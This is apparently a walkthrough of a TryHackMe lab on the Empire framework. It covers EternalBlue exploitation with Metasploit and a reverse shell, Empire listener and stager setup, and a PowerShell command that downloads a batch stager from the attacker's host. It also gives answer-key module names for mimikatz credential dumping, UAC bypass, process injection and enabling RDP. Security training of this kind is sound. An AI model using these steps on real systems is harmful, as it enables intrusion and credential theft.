---
author:
  name: "papadope"
date: 2020-06-23
linktitle: RP Empire
type:
- post
title: RP Empire
weight: 10
series:
- Tryhackme
---

![Room Image](/rpempire/rpempire.jpg)

## Deploy

First of all, let’s deploy our machine. So click on the green deploy button if you haven’t done it already. Afterwards, to access the machine, you need to be inside TryHackMe network. So, get connected to THM VPN. We are not going to talk here about the ways you can connect to the VPN but there are awesome guides out there that can help you manage the frustration.

The first task is to deploy the machine and learn what vulnerabilities are there.

---

#### 1 — Deploy this machine and learn what exploitation this box is susceptible to!

Answer : ``nmap --script vuln {target_ip}``

When the nmap scan is completed you might see something like this kind of result:

```

|_samba-vuln-cve-2012–1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10–054: false |
smb-vuln-ms10–061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17–010: | VULNERABLE: | Remote Code 
Execution vulnerability in Microsoft SMBv1 servers (ms17–010) | State: VULNERABLE | IDs: 
CVE:CVE-2017–0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists 
in Microsoft SMBv1 | servers (ms17–010). | | Disclosure date: 2017–03–14 | References: | 
https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/
en-us/library/security/ms17-010.aspx

```

You need to identify the vulnerability identifier and this is it : ``ms17–010``

---

#### 2 — Exploit the vulnerability to spawn a reverse shell!

First of all, you need to start msfconsole. I prefer the silent way, so i write the 
command``msfconsole -q``. I just dont want the banners 😁

When msf loads you choose the right exploit for the job! This is the right one i have found in 
Google :

``use exploit/windows/smb/ms17_010_eternalblue``

You can simply search inside metasploit for an exploit by running the command:

``search ms17_010_eternalblue``

When you see the exploit you want to use you simply write:

``use exploit_number_here``

And metasploit will pick the hole exploit name for you.

After an update in metasploit, you are not going to be able to get a reverse shell with the 
default payload metasploit gives you so you need to find a better one, that works.

After spending a hole hour searching which one is working, eventually i found it.

``set payload /windows/x64/shell/reverse_tcp``

When you set the payload successfully you need to see the options available to you.

```

run the show options command / or just options (I prefer it).
Change Rhosts to { target_ip }
Change Lhost to your {thm_vpn_ip}
Change Rport to {your_choice}
Run the exploit with the exploit command!

```

---

## Install

It was the first time i used the Empire framework, so i did some reading about it and so 
should you. It is very interesting for anyone who has never used it before.

Github repository :

[Empire Repository](https://github.com/BC-SECURITY/Empire/)

Official website :

[Empire Website](https://www.bc-security.org/post/the-empire-3-0-strikes-back)

When you feel ready, the first thing you need to do of course is to install it.

* Open your terminal and go to opt directory { cd /opt }.

* When you are inside opt copy this git command to get the repository locally git clone https:/
/github.com/BC-SECURITY/Empire/.

* When you successfully download it enter the directory cd /opt/Empire

* When you successfully enter the directory, simply enter this command to start installing in 
into your system ./setup/install.sh.

* When prompted, enter in a server negotiation password. This can be left blank for random 
generation, however, you should record this somewhere such as a LastPass vault. I just entered 
a password i commonly use, just to be sure that i am going to be able to remember it.

* Launch Empire with either ./empire or /opt/Empire/empire

---

## Listeners

As DarkStar7471 said in the first section of Listeners task, If you’re going to play ball, first you have to learn how to catch. So, you need to be familiar with the basic commands and how the Empire framework really works.

#### 1 — Once Empire has launched, type help to view the various menus. Which menu to we launch to access listeners?

Answer : ``listeners``

#### 3 — What command can we now type to view all of the options related to our selected listener type?

Answer : ``info``

#### 4 — Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?

Answer : ``Workinghours``

#### 5 — Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?

Answer : ``DefaultProfile``

#### 6 — What option can we use to set the port which the listener will bind to?

Answer : ``port``

#### 7 — In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this?

Answer : ``ServerVersion``

#### 8 — Launch our newly created listener on port 80 with the command ‘execute’. What message is displayed following successfully launching the listener?

Answer : ``Listener successfully started!``

#### 9 — We can verify that our listener is now active by typing what command?

Answer : ``listeners``

---

## Stagers

As DarkStar7471 said, stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent.

This section is to learn more about stagers and how to work with them. I am providing a link about stagers so feel free to read more about how stagers work and what exactly they do!

[PowershellEmpire](https://www.powershellempire.com/?page_id=104)

#### 1 — First, type the command ‘usestager’ and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?

Answer : ``windows/launcher_bat``

#### 2 — Let’s finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the ‘module’ we have selected?

Answer : ``stager/windows/launcher_bat``

#### 3 — Since we’ve previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?

Answer : ``Listener``

#### 4 — Type execute to finish creating our stager. Where is the stager saved?

Answer : ``/tmp/launcher.bat``

After that I simply cp the launcher bat to the webserver we made with the Empire framework.

```

cp /tmp/launcher.bat /var/www/html/launcher.bat.

```

Why i did that? I did that to prepare the ground for the #5 part.

#### 5 — Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package.

Answer : 
``While i had my reverse shell open inside the target machine i needed to transfer the file { launcher.bat } inside the windows machine. So i did it with the Powershell.``

```

powershell -c “(new-object System.Net.WebClient).DownloadFile(‘http://{your_machine_ip}:
{your_port}/launcher.bat','C:\\Users\\Jon\\Documents\\launcher.bat')"

```

That was a little bit hard to work as i tried a lot of ways until something worked eventually.

Just to be sure that this worked, while you are in the middle of the process, check the terminal you have open and running Empire on your machine to check if you got the request. After that go to this path, inside your windows machine reverse shell, cd /Users/Jon/Documents and do a dir to see what’s inside. If you see the launcher.bat, execute it with just it’s name. Launcher.bat.

---

## Agents and Post-Exploitation

Most of these answers where from help command inside the Empire Framework and almost the other half of this section found from searchmodule command, which is looking for specific modules.

#### 3 — What command do we use to interact with an agent?

Answer : ``interact``

#### 4 — What about if we wanted to list any usernames and passwords we have gathered?

Answer : ``creds``

#### 5 — And if we wanted to ‘deactivate’ an agent for a while to avoid detection?

Answer : ``sleep``

#### 6 — How about if we wanted to delete an agent or disconnect it?

Answer : ``kill``

#### 7 — Moving into the post exploitation modules, what command can we use to search through these?

Answer : ``searchmodule``

#### 8 — We’ll start with the most important module, find the module which plays a specific AC/DC song.

Answer : ``python/trollsploit/osx/thunderstruck``

#### 9 — What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?

Answer : ``powershell/credentials/mimikatz/lsadump``

#### 10 — Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?

Answer : ``bypassuac``

#### 11 — What module family allows us to gather additional information about the network we are on?

Answer : ``recon``

#### 12 — Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)

Answer : ``powershell/management/psinject``

#### 13 — Last but not least, what module can we use to turn on remote desktop access for our purposes?

Answer : ``powershell/management/enable_rdp``

Thank you very much for reading.













